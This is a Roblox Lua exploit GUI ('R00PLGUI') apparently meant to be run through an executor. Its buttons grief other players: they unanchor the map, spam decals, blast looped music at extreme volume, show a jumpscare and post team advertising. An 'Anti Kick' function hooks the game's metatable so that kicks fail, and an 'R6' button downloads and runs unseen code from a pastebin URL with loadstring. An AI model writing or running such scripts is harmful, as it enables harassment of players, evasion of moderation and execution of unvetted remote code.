local p=game.Players.LocalPlayer
local g=p:WaitForChild("PlayerGui")
local s=Instance.new("ScreenGui",g)
s.Name="CustomGui" s.ResetOnSpawn=false
local f=Instance.new("Frame",s)
f.Size=UDim2.new(0,600,0,400)
f.Position=UDim2.new(0.5,-300,0.5,-200)
f.BackgroundColor3=Color3.fromRGB(0,0,0)
f.BorderSizePixel=3 f.BorderColor3=Color3.fromRGB(0,150,255)
f.Active=true f.Draggable=true
local t=Instance.new("TextLabel",f)
t.Size=UDim2.new(1,0,0,35)
t.Position=UDim2.new(0,0,0,-35)
t.BackgroundColor3=Color3.fromRGB(0,0,0)
t.BorderSizePixel=2 t.BorderColor3=Color3.fromRGB(0,150,255)
t.Text="R00PLGUI" t.TextColor3=Color3.fromRGB(0,150,255)
t.Font=Enum.Font.Arcade t.TextScaled=true
local function c(txt,fun)
local b=Instance.new("TextButton",f)
b.Size=UDim2.new(0,180,0,30)
b.BackgroundColor3=Color3.fromRGB(0,0,0)
b.BorderSizePixel=2 b.BorderColor3=Color3.fromRGB(0,150,255)
b.Text=txt b.TextColor3=Color3.fromRGB(0,150,255)
b.Font=Enum.Font.Arcade b.TextScaled=true
b.MouseButton1Click:Connect(fun)
return b
end
local bts={
{"Skybox",function()local l=game.Lighting for _,v in pairs(l:GetChildren())do if v:IsA("Sky")then v:Destroy()end end local s=Instance.new("Sky")s.SkyboxBk="rbxassetid://104628213688210" s.SkyboxDn=s.SkyboxBk s.SkyboxFt=s.SkyboxBk s.SkyboxLf=s.SkyboxBk s.SkyboxRt=s.SkyboxBk s.SkyboxUp=s.SkyboxBk s.Parent=l end},
{"Disco",function()local l=game.Lighting local e=Instance.new("ColorCorrectionEffect",l)local z=function(x)return math.acos(math.cos(x*math.pi))/math.pi end local c=0 spawn(function()while true do e.TintColor=Color3.fromHSV(z(c),1,1)l.Ambient=Color3.fromHSV(z(c),1,1)c+=.01 wait(.1)end end)end},
{"Unanchor All",function()for _,o in pairs(workspace:GetDescendants())do if o:IsA("BasePart")and o.Anchored then o.Anchored=false end end end},
{"Jumpscare",function()local g=Instance.new("ScreenGui",p.PlayerGui)local i=Instance.new("ImageLabel",g)i.AnchorPoint=Vector2.new(.5,.5)i.Position=UDim2.new(.5,0,.5,0)i.Size=UDim2.new(1,0,1,0)i.Image="http://www.roblox.com/asset/?id=134335052446287"i.BackgroundTransparency=1 i.ZIndex=9999 local s=Instance.new("Sound",g)s.SoundId="rbxassetid://7024873003"s.Volume=10 s:Play()wait(6)g:Destroy()end},
{"Decal Spam",function()local d=104628213688210 local function e(r)for _,v in pairs(r:GetChildren())do if v:IsA("Decal")and v.Texture~="http://www.roblox.com/asset/?id="..d then v:Destroy()elseif v:IsA("BasePart")then v.Material="Plastic"v.Transparency=0 for _,f in pairs({"Front","Back","Right","Left","Top","Bottom"})do local n=Instance.new("Decal",v)n.Texture="http://www.roblox.com/asset/?id="..d n.Face=f end end e(v)end end e(workspace)end},
{"SelectionBox Red",function()local ps=game.Players local w=workspace local function a(p)if p:IsA("BasePart")and not p:FindFirstChild("RBox")then local b=Instance.new("SelectionBox")b.Name="RBox"b.Adornee=p b.LineThickness=.05 b.Color3=Color3.fromRGB(255,0,0) b.Parent=p end end for _,p in ipairs(w:GetDescendants())do a(p)end for _,pl in ipairs(ps:GetPlayers())do if pl.Character then for _,pt in ipairs(pl.Character:GetDescendants())do a(pt)end end end ps.PlayerAdded:Connect(function(pl)pl.CharacterAdded:Connect(function(c)wait(1)for _,pt in ipairs(c:GetDescendants())do a(pt)end end)end)w.DescendantAdded:Connect(a)end},
{"Hint",function()Instance.new("Hint",workspace).Text="TEAM R00PLKKIDD JOIN NOW!!!"end},
{"Music",function()local s=Instance.new("Sound",workspace)s.SoundId="rbxassetid://1839246711"s.Volume=999999 s.Looped=true s.PlaybackSpeed=.8 s:Play()end},
{"Stop Music",function()for _,s in pairs(game:GetDescendants())do if s:IsA("Sound")then s:Stop()end end end},
}
for i,v in ipairs(bts)do local b=c(v[1],v[2])b.Position=UDim2.new(0,10,0,10+(i-1)*35)end
local function lb(txt,y,fun)local b=Instance.new("TextButton",f)b.Size=UDim2.new(0,180,0,30)b.Position=UDim2.new(0,210,0,y)b.BackgroundColor3=Color3.fromRGB(0,0,0)b.BorderSizePixel=2 b.BorderColor3=Color3.fromRGB(0,150,255)b.Text=txt b.TextColor3=Color3.fromRGB(0,150,255)b.Font=Enum.Font.Arcade b.TextScaled=true b.MouseButton1Click:Connect(fun)end
lb("Rain of Blocks",40,function()local function b()local p=Instance.new("Part")p.Size=Vector3.new(4,4,4)p.Position=Vector3.new(math.random(-100,100),100,math.random(-100,100))p.Anchored=false p.Color=Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))p.Parent=workspace end spawn(function()while true do b()wait(.1)end end)end)
lb("Anti Kick",75,function()local mt=getrawmetatable(game)setreadonly(mt,false)local old=mt.__namecall mt.__namecall=newcclosure(function(s,...)local m=getnamecallmethod()if tostring(s)=="Kick"and m=="FireServer"then return nil elseif m=="Kick" and s==p then return nil end return old(s,...)end)setreadonly(mt,true)end)
lb("Big Message",110,function()local m=Instance.new("Message",workspace)m.Text="team R00plkkidd Join now!!!"wait(13)m:Destroy()end)
lb("Particles",145,function()for _,v in pairs(game.Players:GetPlayers())do if v.Character and v.Character:FindFirstChild("Head")then local e=Instance.new("ParticleEmitter",v.Character.Head)e.Texture="http://www.roblox.com/asset/?id=126283385320628"e.Rate=50 e.Lifetime=NumberRange.new(1)e.Speed=NumberRange.new(5)e.VelocitySpread=180 end end end)
local r6=Instance.new("TextButton",f)r6.Size=UDim2.new(0,60,0,30)r6.Position=UDim2.new(0,10,0,-30)r6.BackgroundColor3=Color3.fromRGB(0,0,0)r6.BorderSizePixel=2 r6.BorderColor3=Color3.fromRGB(0,150,255)r6.Text="R6"r6.TextColor3=Color3.fromRGB(0,150,255)r6.Font=Enum.Font.Arcade r6.TextScaled=true r6.MouseButton1Click:Connect(function()loadstring(game:HttpGet("https://pastebin.com/raw/jHGVauVX"))()end)